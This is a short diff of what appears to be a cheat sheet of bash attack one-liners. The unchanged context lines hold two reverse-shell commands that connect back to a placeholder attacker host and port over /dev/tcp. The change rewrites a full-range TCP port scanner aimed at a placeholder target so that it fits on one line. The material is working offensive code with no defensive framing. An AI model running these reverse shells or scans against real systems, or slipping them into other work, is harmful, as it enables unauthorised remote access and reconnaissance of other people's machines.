@@ -333,12 +333,7 @@ bash -i >& /dev/tcp/attacker_IP/port_here 0>&1
 0<&111;exec 111<>/dev/tcp/attacker_IP/port_here; bash <&111 >&111 2>&111
 
 # scan
-host=target_IP_here
-echo "--- scan starting ---"
-for port in {1..65535}; do
-  timeout .1 bash -c "echo >/dev/tcp/$host/$port" && echo "port $port is open"
-done
-echo "--- scan finished ---"
+host=target_IP_here; echo "--- scan starting ---"; for port in {1..65535}; do timeout .1 bash -c "echo >/dev/tcp/$host/$port" && echo "port $port is open"; done; echo "--- scan finished ---"
 ```
 
 
